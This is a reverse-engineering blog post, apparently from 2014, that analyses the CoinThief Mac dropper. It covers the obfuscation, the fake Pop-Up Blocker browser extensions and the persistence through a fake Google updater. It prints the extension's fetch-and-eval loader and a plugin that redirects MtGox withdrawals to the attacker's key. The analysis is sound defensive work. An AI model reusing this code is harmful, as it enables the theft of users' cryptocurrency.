<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Analysis of CoinThief/A "dropper" | Reverse Engineering</title><meta name=keywords content="cointhief,bitcoin,steal,malware,trojan,dropper,reverse,reversing,debug,debugging,obfuscation,obfuscated,ida,disassembler,hook,hijack,hijacking,os x,mac os x,os x malware,virus,malicious,steal,stealing"><meta name=description content="There is no such thing as malware in OS X but last week another sample was spotted and made the ânewsâ. I am talking about CoinThief, a malware designed to hijack Bitcoin accounts and steal everything (I must confess I laughed a bit; I think Bitcoin is just a bullshit pyramid scheme but I digress).
There are a few samples out there, in different stages of evolution, so this is probably not a very recent operation."><meta name=author content><link rel=canonical href=https://reverse.put.as/2014/02/16/analysis-of-cointhiefa-dropper/><link crossorigin=anonymous href=/assets/css/stylesheet.f9dd9e48326c9379e713387f8e19bca159fa3c3f4b36907a4db01461f60456bb.css integrity="sha256-+d2eSDJsk3nnEzh/jhm8oVn6PD9LNpB6TbAUYfYEVrs=" rel="preload stylesheet" as=style><link rel=icon href=https://reverse.put.as/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://reverse.put.as/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://reverse.put.as/favicon-32x32.png><link rel=apple-touch-icon href=https://reverse.put.as/apple-touch-icon.png><link rel=mask-icon href=https://reverse.put.as/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=manifest href=/manifest.json><meta property="og:title" content="Analysis of CoinThief/A &#34;dropper&#34;"><meta property="og:description" content="There is no such thing as malware in OS X but last week another sample was spotted and made the ânewsâ. I am talking about CoinThief, a malware designed to hijack Bitcoin accounts and steal everything (I must confess I laughed a bit; I think Bitcoin is just a bullshit pyramid scheme but I digress).
There are a few samples out there, in different stages of evolution, so this is probably not a very recent operation."><meta property="og:type" content="article"><meta property="og:url" content="https://reverse.put.as/2014/02/16/analysis-of-cointhiefa-dropper/"><meta property="article:section" content="post"><meta property="article:published_time" content="2014-02-16T11:51:26+01:00"><meta property="article:modified_time" content="2014-02-16T11:51:26+01:00"><meta property="og:site_name" content="Reverse Engineering"><meta name=twitter:card content="summary"><meta name=twitter:title content="Analysis of CoinThief/A &#34;dropper&#34;"><meta name=twitter:description content="There is no such thing as malware in OS X but last week another sample was spotted and made the ânewsâ. I am talking about CoinThief, a malware designed to hijack Bitcoin accounts and steal everything (I must confess I laughed a bit; I think Bitcoin is just a bullshit pyramid scheme but I digress).
There are a few samples out there, in different stages of evolution, so this is probably not a very recent operation."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://reverse.put.as/post/"},{"@type":"ListItem","position":2,"name":"Analysis of CoinThief/A \"dropper\"","item":"https://reverse.put.as/2014/02/16/analysis-of-cointhiefa-dropper/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Analysis of CoinThief/A \"dropper\"","name":"Analysis of CoinThief\/A \u0022dropper\u0022","description":"There is no such thing as malware in OS X but last week another sample was spotted and made the ânewsâ. I am talking about CoinThief, a malware designed to hijack Bitcoin accounts and steal everything (I must confess I laughed a bit; I think Bitcoin is just a bullshit pyramid scheme but I digress).\nThere are a few samples out there, in different stages of evolution, so this is probably not a very recent operation.","keywords":["cointhief","bitcoin","steal","malware","trojan","dropper","reverse","reversing","debug","debugging","obfuscation","obfuscated","ida","disassembler","hook","hijack","hijacking","os x","mac os x","os x malware","virus","malicious","steal","stealing"],"articleBody":"There is no such thing as malware in OS X but last week another sample was spotted and made the ânewsâ. I am talking about CoinThief, a malware designed to hijack Bitcoin accounts and steal everything (I must confess I laughed a bit; I think Bitcoin is just a bullshit pyramid scheme but I digress).\nThere are a few samples out there, in different stages of evolution, so this is probably not a very recent operation. Nicholas Ptacek from SecureMac broke the story and did an initial analysis. Check his link here and also ThreatPost for some details about the different infected applications and how it started.\nThis post will target the initial stage of the malware packed with StealthBit application and a bit into the installed malware browser extensions.\nFirst step is to load the main binary into IDA or Hopper (I still use IDA mostly out of lazyness and habit). We are presented with this nice picture (not all methods shown) of very weird class and method names.\nThis triggers immediate attention which I donât think itâs good at all if you are trying to hide attention. Another example this time from class-dump:\n__attribute__((visibility(\"hidden\"))) @interface IOSDJDSNSDOWKDII : NSObject { NSString *_fihwjsndkfkjs; NSString *_hisdhiwjknsk; NSString *_sdhijkskjdfd; } @property(copy, nonatomic) NSString *sdhijkskjdfd; // @synthesize sdhijkskjdfd=_sdhijkskjdfd; @property(copy, nonatomic) NSString *hisdhiwjknsk; // @synthesize hisdhiwjknsk=_hisdhiwjknsk; @property(copy, nonatomic) NSString *fihwjsndkfkjs; // @synthesize fihwjsndkfkjs=_fihwjsndkfkjs; - (void).cxx_destruct; - (BOOL)hidfisdfsguiwomc; - (id)initWiwijmxug:(id)arg1 jifikwdff:(id)arg2 mkoxjnwhd:(id)arg3; The strings are also a good starting point to start understanding the puzzle. Itâs easy to spot base64 encoded strings, confirmed by the presence of base64 methods.\nbGFzdENocm9tZVBha1BhdGNoZWRWZXJzaW9u L0FwcGxpY2F0aW9ucy9Hb29nbGUgQ2hyb21lLmFwcC9Db250ZW50cy9WZXJzaW9ucw== q24@?0@\"NSString\"8@\"NSString\"16 R29vZ2xlIENocm9tZSBGcmFtZXdvcmsuZnJhbWV3b3JrL1Jlc291cmNlcw== RXh0ZW5zaW9uU2V0dGluZ3MucmV0dXJuRXh0ZW5zaW9uc0RhdGEgPSBmdW5jdGlvbihleHRlbnNpb25zRGF0YSkgewogICAgLy8gV2UgY2FuIGdldCBjYWxsZWQgbWFueSB0aW1lcyBpbiBzaG9ydCBvcmRlciwgdGh1cyB3ZSBuZWVkIHRvCiAgICAvLyBiZSBjYXJlZnVsIHRvIHJlbW92ZSB0aGUgJ2ZpbmlzaGVkIGxvYWRpbmcnIHRpbWVvdXQuCiAgICA= RXh0ZW5zaW9uU2V0dGluZ3MucmV0dXJuRXh0ZW5zaW9uc0RhdGEgPSBmdW5jdGlvbihleHRlbnNpb25zRGF0YSkgewpmb3IodmFyIGE9MCxiPWV4dGVuc2lvbnNEYXRhLmV4dGVuc2lvbnMsYz0wO2M8Yi5sZW5ndGg7YysrKWlmKCIlQCI9PWJbY10uaWQpe2E9YztiLnNwbGljZShhLDEpO2JyZWFrfQo= At this point we know we have a binary with obfuscated strings and class/method names. Different strategies are possible to continue analysis and reversing. DTrace and similar utilities can be used to have a general overview of what the binary is trying to do, or we can go directly into IDA and start making sense of the code. In the second option we can start reversing at main() or we can start checking what the obfuscated methods are trying to do and rename to something meaningful. I am a great fan of the second so I started checking each method sequentially.\nThe getter and setter methods are easy to spot. The setter methods start with set in the name because they are automatically generated via property keyword, and getters because their code just retrieves the instance variable. The obfuscator is probably a script that modifies the names before compilation (I donât think a define is enough for this), a LLVM pass, or just developed with those names.\nNow let me show you a very simple method that writes a mutex to ~/Library/Preferences/fsdiskquota1. In this file is present it means that the dropper code was previously executed and it should not happen again.\nThe base64 string is decoded, tilde expanded to the full path and fsdiskquota1 mutex written. Nothing very complicated.\nThe trick here is to start renaming the methods so you can easily follow up the code. That is the annoying part of this obfuscation method but with a small dose of patience and time it falls apart. Renamed and commented method:\nTo make it easier for you this is a screenshot of the methods I renamed. Not all but the most important to understand what the dropper does.\nThe init method for the class HIFOWEIOWEOJSDJFIVB initializes an instance variable with a NSFileManager object and retrieves the location of the current logged in user NSLibraryDirectory. Then what I renamed as startBackdoor is called and the fun starts.\nThis method does the following:\nErases itself and replaces it with the original StealthBit binary. Starts the original binary. At this point you have the original application running and the dropper, which will continue its work in the background. Verifies if the mutex exists. If mutex does not exist, write it and continue unpacking the malware payload. Browser extensions for Safari and Chrome are unpacked into a temporary folder. If unpack was successful, Safari version is retrieved. The extensions are only compatible with Safari 5 or higher. Installs Safari extension that is masked as a pop up blocker. Retrieve Chrome version (if installed). Only supports Chrome v25 or higher. Installs Chrome extension. Verifies if Library/Handsoff folder exists. If Handsoff is not installed the backdoor will be made persistent by creating a fake Googe Software Update launch agent. Remove temporary files and exit. At this point and assuming the whole process was successful against Safari, Chrome, and persistence, we have two malware extensions loaded into the browsers and a RAT installed in the target machine. Two screenshots of the startBackdoor method:\nThe original binary is located in the _CodeSignature folder and named .dSYM. The extensions are located in the same folder in a bzip2 archive named .sig. The dropper does not show in the Dock because LSUIElement setting is used in the Info.plist. When the dropper erases itself, the setting is removed from the plist so the legit application shows up in the Dock. For the user everything looks normal â application startup time is fast. The original application is started by creating a new NSTask and using the open command to start again the now legit StealthBit.app.\nThe functions that install the extensions are not very interesting in terms of reversing. They locate the extension folders, and install/active the malware extension. The Chrome related methods are a bit more complex because they look up more information about its internals and mess with the paks and so on. I donât know much about Chrome internal organization and wasnât much interested in reversing them â nothing valuable to me in terms of understanding the whole process.\nNow a bit into the extensions, using the Safari version as reference. As previously said, it is spoofed as a Pop-Up Blocker made by Eric Wong using KangoExtensions. The contents of description file are:\n{ \"kango_version\": \"1.3.0 d6f8f2cf3761\", \"content_scripts\": [ \"libs/jquery-2.0.3.min.js\", \"injected/main.js\" ], \"name\": \"Pop-Up Blocker\", \"creator\": \"Eric Wong\", \"kango_package_id\": \"dev\", \"background_scripts\": [ \"libs/jquery-2.0.3.min.js\", \"settings/defaultSettings.js\", \"settings/settings.js\", \"global/encryption/jsEncrypt.js\", \"global/encryption/updateVerifySignature.js\", \"global/cryptoJS/components/core-min.js\", \"global/cryptoJS/components/enc-base64-min.js\", \"global/cryptoJS/components/sha1-min.js\", \"global/cryptoJS/rollups/aes.js\", \"global/cryptoJS/rollups/md5.js\", \"global/cryptoJS/rollups/tripledes.js\", \"global/jsrsasign/ext/jsbn-min.js\", \"global/jsrsasign/ext/jsbn2-min.js\", \"global/jsrsasign/ext/base64-min.js\", \"global/jsrsasign/ext/rsa-min.js\", \"global/jsrsasign/ext/rsa2-min.js\", \"global/jsrsasign/asn1hex-1.1.min.js\", \"global/jsrsasign/rsapem-1.1.min.js\", \"global/jsrsasign/rsasign-1.2.min.js\", \"global/jsrsasign/x509-1.1.min.js\", \"global/jsrsasign/crypto-1.1.min.js\", \"background.js\" ], \"homepage_url\": \"http://kangoextensions.com/\", \"version\": \"1.0.0\", \"id\": \"com.optimalcycling.safari.popupblocker\", \"description\": \"Blocks pop-up windows and other annoyances.\" } Screenshot of the Safari extension:\nThe Kango stuff is mostly uninteresting except for the background.js file. What it does is to try to contact a remote server and download a file, which will be the effective malware payload responsible for hijacking the Bitcoin sites accounts information.\nif(!kango.storage.getItem('installed')) { //Get first version and run $.get(settings.get('reportServer')+\"/updates/firstUpdate.php\", function(data) { //Checking signature if(updateVerifySignature(CryptoJS.SHA1(data.global), CryptoJS.SHA1(data.injected), data.signature)) { //Saving to localstorage kango.storage.setItem('globalJS',data.global); kango.storage.setItem('injectedJS',data.injected); kango.storage.setItem('installed',true); //Saving current version kango.storage.setItem('extensionUpdateTimestamp',0); kango.storage.setItem('agentUpdateTimestamp',0); //Executing script eval(kango.storage.getItem('globalJS')); if(settings.get('debug')) console.log(\"Valid First Release\"); } else { if(settings.get('debug')) console.log(\"First Release: Bad Signature\"); } }, \"json\" ); } else { //Running saved version try { eval(kango.storage.getItem('globalJS')); } catch(err) { if(kango.storage.getItem('globalJS_old')) { kango.storage.setItem('globalJS', kango.storage.getItem('globalJS_old')); } else { //Error in version 0, resetting extension. kango.storage.clear(); } } } if(settings.get('debug')) { function uninstall() { console.log(\"Uninstalling...\"); kango.storage.clear(); } } A screenshot of the connection attempt to the remote server:\nIf you are interested in looking at the contents of the malware payload just download it here. Password is âinfected!â. You can find javascript code such as this sample for the MtGoxPlugin:\nMtGoxPlugin.prototype.injectPage = function (withdrawKey) { function injectScript(source) { var elem = document.createElement(\"script\"); elem.type = \"text/javascript\"; elem.innerHTML = source; document.head.appendChild(elem); } var balance = Math.round((parseFloat($('#virtualCur span').text().match(/(.*)\\\\s/)[1])-0.001)*100000000)/100000000; injectScript(\"var pubKey = '\"+ withdrawKey +\"'; balanceBTC = '\"+ balance +\"'; \"+ \"(\"+(function() { $.ajaxSetup({ beforeSend: function(jqXHR, settings) { if(settings.url == '/api/2/money/bitcoin/send_simple') { settings.data = settings.data.replace(/amount=.*\\\\\u0026address=/, 'amount='+ balanceBTC +'\u0026address='); settings.data = settings.data.replace(/address=.*\\\\\u0026address/, 'address='+ pubKey +'\u0026address'); } }}); }).toString()+\")()\"); }; The last step is to reverse the RAT, a binary called Agent and installed in ~/Library/Application Support/.com.google.softwareUpdateAgent. I did not reverse this module yet but it appears to be responsible for sending data to the remote servers and also remote access to the infected machines. It has a few obfuscated methods reused from the dropper but everything else is not obfuscated. There is a method that verifies the presence of Little Snitch, which is funny because that doesnât exist in the dropper. Probably some quality control issues! Thereâs also a method checking for 1Password.\nWhat else is there to say about this? I have at least five different infected applications, in different stages of evolution (some without obfuscated methods).\nAs far as I have read/know they were available on popular downloads sites. Trust is a difficult problem to solve.\nWhat are the conclusions and lessons from this malware?\nThereâs some fuss around regarding my previous post about evil iTunes plugins, with a quite surprising number of âuninformedâ people using the argument of âarbitrary code executionâ. Well, the thing is that everything you download from the Internet is arbitrary code unless you reverse every single binary, and that has the strong assumption that you are able to understand everything it does. Quite a task I might say!\nA normal looking application can easily copy malicious payloads to many different places, iTunes plugins being one of the interesting targets, but it can also easily patch other applications since most are installed with same permissions as the normal user. Thereâs no need for exploits, suspicious please gimme r00t dialogs. Just an innocent app you download and trust. In the post-Snowden world what guarantees you have that famous apps donât have state-sponsored payloads? None I might say.\nThe open source bullshit principle of many eyes looking has been shown too many times to be a really bad assumption â not that many eyes are looking and stupid bugs are kept alive for many years. Sandboxes and the AppStore improve the situation but they still suffer from vulnerabilities and their binaries are probably more opaque (iOS in particular) and with less incentives to be reversed (Apple wouldnât let malware in the AppStore, right?).\nI will probably edit this post in the next days to add some missing info or improve some paragraphs. Too tired right now.\nHave fun,\nfG!\n","wordCount":"1671","inLanguage":"en","datePublished":"2014-02-16T11:51:26+01:00","dateModified":"2014-02-16T11:51:26+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://reverse.put.as/2014/02/16/analysis-of-cointhiefa-dropper/"},"publisher":{"@type":"Organization","name":"Reverse Engineering","logo":{"@type":"ImageObject","url":"https://reverse.put.as/favicon.ico"}}}</script></head><body id=top><script crossorigin=anonymous src=/assets/js/theme.567f132bb6afa7942bdca6f777885f2494a00b008120e9d9a0b203d3a2a74e6d.js integrity="sha256-Vn8TK7avp5Qr3Kb3d4hfJJSgCwCBIOnZoLID06KnTm0="></script><header class=header><nav class=nav><div class=logo><a href=https://reverse.put.as/ accesskey=h title="  (Alt + H)"><img src=https://reverse.put.as/images/logo.png alt aria-label=logo height=40></a><div class=logo-switches><button id=theme-toggle accesskey=t title="Switch between dark and light mode"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button>
<button id=font-toggle title="Switch between serif and sans fonts"><svg id="fonton" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentcolor" class="bi bi-toggle-on" viewBox="0 0 16 16"><path d="M5 3a5 5 0 000 10h6a5 5 0 000-10H5zm6 9a4 4 0 110-8 4 4 0 010 8z"/></svg><svg id="fontoff" xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentcolor" class="bi bi-toggle-off" viewBox="0 0 16 16"><path d="M11 4a4 4 0 010 8H8a4.992 4.992.0 002-4A4.992 4.992.0 008 4h3zm-6 8a4 4 0 110-8 4 4 0 010 8zM0 8a5 5 0 005 5h6a5 5 0 000-10H5A5 5 0 000 8z"/></svg></button></div></div><ul id=menu><li><a href=https://reverse.put.as/ title=Home><span>Home</span></a></li><li><a href=https://reverse.put.as/about/ title=About><span>About</span></a></li><li><a href=https://reverse.put.as/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://reverse.put.as/crackmes/ title=Crackmes><span>Crackmes</span></a></li><li><a href=https://reverse.put.as/patches/ title=Patches><span>Patches</span></a></li><li><a href=https://reverse.put.as/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://papers.put.as title=Papers><span>Papers</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>Analysis of CoinThief/A "dropper"</h1><div class=post-meta><span title='2014-02-16 11:51:26 +0100 +0100'>February 16, 2014</span>&nbsp;Â·&nbsp;8 min&nbsp;Â·&nbsp;1671 words</div></header><div class=post-content><p>There is no such thing as malware in OS X but last week another sample was spotted and made the ânewsâ. I am talking about <strong>CoinThief</strong>, a malware designed to hijack <strong>Bitcoin</strong> accounts and steal everything (I must confess I laughed a bit; I think <strong>Bitcoin</strong> is just a bullshit pyramid scheme but I digress).</p><p>There are a few samples out there, in different stages of evolution, so this is probably not a very recent operation. <em>Nicholas Ptacek</em> from <a href=http://www.securemac.com/>SecureMac</a> broke the story and did an initial analysis. Check his link <a href=http://www.securemac.com/CoinThief-BitCoin-Trojan-Horse-MacOSX.php>here</a> and also <a href=http://threatpost.com/cointhief-bitcoin-trojan-found-on-popular-download-sites/104234>ThreatPost</a> for some details about the different infected applications and how it started.<br>This post will target the initial stage of the malware packed with <strong>StealthBit</strong> application and a bit into the installed malware browser extensions.</p><p>First step is to load the main binary into <em>IDA</em> or <em>Hopper</em> (I still use <em>IDA</em> mostly out of lazyness and habit). We are presented with this nice picture (not all methods shown) of very weird class and method names.</p><figure><a href=/wp-content/uploads/2014/02/obfuscated_names.png><img loading=lazy src=/wp-content/uploads/2014/02/obfuscated_names.png alt="obfuscated names"></a></figure><p>This triggers immediate attention which I donât think itâs good at all if you are trying to hide attention. Another example this time from <em>class-dump</em>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-cpp data-lang=cpp><span class=line><span class=cl><span class=n>__attribute__</span><span class=p>((</span><span class=n>visibility</span><span class=p>(</span><span class=s>&#34;hidden&#34;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>interface</span> <span class=nl>IOSDJDSNSDOWKDII</span> <span class=p>:</span> <span class=n>NSObject</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl> <span class=n>NSString</span> <span class=o>*</span><span class=n>_fihwjsndkfkjs</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=n>NSString</span> <span class=o>*</span><span class=n>_hisdhiwjknsk</span><span class=p>;</span>
</span></span><span class=line><span class=cl> <span class=n>NSString</span> <span class=o>*</span><span class=n>_sdhijkskjdfd</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>property</span><span class=p>(</span><span class=n>copy</span><span class=p>,</span> <span class=n>nonatomic</span><span class=p>)</span> <span class=n>NSString</span> <span class=o>*</span><span class=n>sdhijkskjdfd</span><span class=p>;</span> <span class=c1>// @synthesize sdhijkskjdfd=_sdhijkskjdfd;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>@</span><span class=n>property</span><span class=p>(</span><span class=n>copy</span><span class=p>,</span> <span class=n>nonatomic</span><span class=p>)</span> <span class=n>NSString</span> <span class=o>*</span><span class=n>hisdhiwjknsk</span><span class=p>;</span> <span class=c1>// @synthesize hisdhiwjknsk=_hisdhiwjknsk;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=err>@</span><span class=n>property</span><span class=p>(</span><span class=n>copy</span><span class=p>,</span> <span class=n>nonatomic</span><span class=p>)</span> <span class=n>NSString</span> <span class=o>*</span><span class=n>fihwjsndkfkjs</span><span class=p>;</span> <span class=c1>// @synthesize fihwjsndkfkjs=_fihwjsndkfkjs;
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>-</span> <span class=p>(</span><span class=kt>void</span><span class=p>).</span><span class=n>cxx_destruct</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>-</span> <span class=p>(</span><span class=n>BOOL</span><span class=p>)</span><span class=n>hidfisdfsguiwomc</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>-</span> <span class=p>(</span><span class=n>id</span><span class=p>)</span><span class=nl>initWiwijmxug</span><span class=p>:(</span><span class=n>id</span><span class=p>)</span><span class=n>arg1</span> <span class=nl>jifikwdff</span><span class=p>:(</span><span class=n>id</span><span class=p>)</span><span class=n>arg2</span> <span class=nl>mkoxjnwhd</span><span class=p>:(</span><span class=n>id</span><span class=p>)</span><span class=n>arg3</span><span class=p>;</span>
</span></span></code></pre></div><p>The strings are also a good starting point to start understanding the puzzle. Itâs easy to spot <strong>base64</strong> encoded strings, confirmed by the presence of <strong>base64</strong> methods.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-plaintext data-lang=plaintext><span class=line><span class=cl>bGFzdENocm9tZVBha1BhdGNoZWRWZXJzaW9u
</span></span><span class=line><span class=cl>L0FwcGxpY2F0aW9ucy9Hb29nbGUgQ2hyb21lLmFwcC9Db250ZW50cy9WZXJzaW9ucw==
</span></span><span class=line><span class=cl>q24@?0@&#34;NSString&#34;8@&#34;NSString&#34;16
</span></span><span class=line><span class=cl>R29vZ2xlIENocm9tZSBGcmFtZXdvcmsuZnJhbWV3b3JrL1Jlc291cmNlcw==
</span></span><span class=line><span class=cl>RXh0ZW5zaW9uU2V0dGluZ3MucmV0dXJuRXh0ZW5zaW9uc0RhdGEgPSBmdW5jdGlvbihleHRlbnNpb25zRGF0YSkgewogICAgLy8gV2UgY2FuIGdldCBjYWxsZWQgbWFueSB0aW1lcyBpbiBzaG9ydCBvcmRlciwgdGh1cyB3ZSBuZWVkIHRvCiAgICAvLyBiZSBjYXJlZnVsIHRvIHJlbW92ZSB0aGUgJ2ZpbmlzaGVkIGxvYWRpbmcnIHRpbWVvdXQuCiAgICA=
</span></span><span class=line><span class=cl>RXh0ZW5zaW9uU2V0dGluZ3MucmV0dXJuRXh0ZW5zaW9uc0RhdGEgPSBmdW5jdGlvbihleHRlbnNpb25zRGF0YSkgewpmb3IodmFyIGE9MCxiPWV4dGVuc2lvbnNEYXRhLmV4dGVuc2lvbnMsYz0wO2M8Yi5sZW5ndGg7YysrKWlmKCIlQCI9PWJbY10uaWQpe2E9YztiLnNwbGljZShhLDEpO2JyZWFrfQo=
</span></span></code></pre></div><p>At this point we know we have a binary with obfuscated strings and class/method names. Different strategies are possible to continue analysis and reversing. <strong>DTrace</strong> and similar utilities can be used to have a general overview of what the binary is trying to do, or we can go directly into <em>IDA</em> and start making sense of the code. In the second option we can start reversing at <strong>main()</strong> or we can start checking what the obfuscated methods are trying to do and rename to something meaningful. I am a great fan of the second so I started checking each method sequentially.</p><p>The <strong>getter</strong> and <strong>setter</strong> methods are easy to spot. The <strong>setter</strong> methods start with set in the name because they are automatically generated via property keyword, and <strong>getters</strong> because their code just retrieves the instance variable. The obfuscator is probably a script that modifies the names before compilation (I donât think a define is enough for this), a LLVM pass, or just developed with those names.</p><figure><a href=/wp-content/uploads/2014/02/setter_getter_example.png><img loading=lazy src=/wp-content/uploads/2014/02/setter_getter_example.png alt="setter getter example"></a></figure><p>Now let me show you a very simple method that writes a <strong>mutex</strong> to <strong>~/Library/Preferences/fsdiskquota1</strong>. In this file is present it means that the dropper code was previously executed and it should not happen again.</p><figure><a href=/wp-content/uploads/2014/02/obfuscated_mutex_creation.png><img loading=lazy src=/wp-content/uploads/2014/02/obfuscated_mutex_creation.png alt="obfuscated mutex creation"></a></figure><p>The <strong>base64</strong> string is decoded, tilde expanded to the full path and <strong>fsdiskquota1</strong> mutex written. Nothing very complicated.<br>The trick here is to start renaming the methods so you can easily follow up the code. That is the annoying part of this obfuscation method but with a small dose of patience and time it falls apart. Renamed and commented method:</p><figure><a href=/wp-content/uploads/2014/02/mutex_creation.png><img loading=lazy src=/wp-content/uploads/2014/02/mutex_creation.png alt="mutex creation"></a></figure><p>To make it easier for you this is a screenshot of the methods I renamed. Not all but the most important to understand what the dropper does.</p><figure><a href=/wp-content/uploads/2014/02/renamed_methods.png><img loading=lazy src=/wp-content/uploads/2014/02/renamed_methods.png alt="renamed methods"></a></figure><p>The init method for the class <strong>HIFOWEIOWEOJSDJFIVB</strong> initializes an instance variable with a <strong>NSFileManager</strong> object and retrieves the location of the current logged in user <strong>NSLibraryDirectory</strong>. Then what I renamed as <strong>startBackdoor</strong> is called and the fun starts.</p><p>This method does the following:</p><ul><li>Erases itself and replaces it with the original <strong>StealthBit</strong> binary.</li><li>Starts the original binary. At this point you have the original application running and the dropper, which will continue its work in the background.</li><li>Verifies if the <strong>mutex</strong> exists.</li><li>If <strong>mutex</strong> does not exist, write it and continue unpacking the malware payload.</li><li>Browser extensions for <em>Safari</em> and <em>Chrome</em> are unpacked into a temporary folder.</li><li>If unpack was successful, <em>Safari</em> version is retrieved. The extensions are only compatible with <strong>Safari 5</strong> or higher.</li><li>Installs <em>Safari</em> extension that is masked as a <strong>pop up blocker</strong>.</li><li>Retrieve <em>Chrome</em> version (if installed). Only supports <strong>Chrome v25</strong> or higher.</li><li>Installs <em>Chrome</em> extension.</li><li>Verifies if <strong>Library/Handsoff</strong> folder exists.</li><li>If <strong>Handsoff</strong> is not installed the backdoor will be made persistent by creating a <strong>fake Googe Software Update</strong> launch agent.</li><li>Remove temporary files and exit.</li></ul><p>At this point and assuming the whole process was successful against <em>Safari</em>, <em>Chrome</em>, and persistence, we have two malware extensions loaded into the browsers and a <strong>RAT</strong> installed in the target machine. Two screenshots of the <strong>startBackdoor</strong> method:</p><figure><a href=/wp-content/uploads/2014/02/startbackdoor_1.png><img loading=lazy src=/wp-content/uploads/2014/02/startbackdoor_1.png alt="start backdoor 1"></a></figure><figure><a href=/wp-content/uploads/2014/02/startbackdoor_2.png><img loading=lazy src=/wp-content/uploads/2014/02/startbackdoor_2.png alt="start backdoor 2"></a></figure><p>The original binary is located in the <strong>_CodeSignature</strong> folder and named <strong>.dSYM</strong>. The extensions are located in the same folder in a bzip2 archive named <strong>.sig</strong>. The dropper does not show in the <em>Dock</em> because <strong>LSUIElement</strong> setting is used in the <strong>Info.plist</strong>. When the dropper erases itself, the setting is removed from the plist so the legit application shows up in the <em>Dock</em>. For the user everything looks normal â application startup time is fast. The original application is started by creating a new <strong>NSTask</strong> and using the <strong>open</strong> command to start again the now legit <strong>StealthBit.app</strong>.</p><p>The functions that install the extensions are not very interesting in terms of reversing. They locate the extension folders, and install/active the malware extension. The <em>Chrome</em> related methods are a bit more complex because they look up more information about its internals and mess with the <strong>paks</strong> and so on. I donât know much about <em>Chrome</em> internal organization and wasnât much interested in reversing them â nothing valuable to me in terms of understanding the whole process.</p><p>Now a bit into the extensions, using the <em>Safari</em> version as reference. As previously said, it is spoofed as a <strong>Pop-Up Blocker</strong> made by <em>Eric Wong</em> using <strong>KangoExtensions</strong>. The contents of description file are:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;kango_version&#34;</span><span class=p>:</span> <span class=s2>&#34;1.3.0 d6f8f2cf3761&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;content_scripts&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;libs/jquery-2.0.3.min.js&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;injected/main.js&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>],</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;name&#34;</span><span class=p>:</span> <span class=s2>&#34;Pop-Up Blocker&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=nt>&#34;creator&#34;</span><span class=p>:</span> <span class=s2>&#34;Eric Wong&#34;</span><span class=p>,</span>
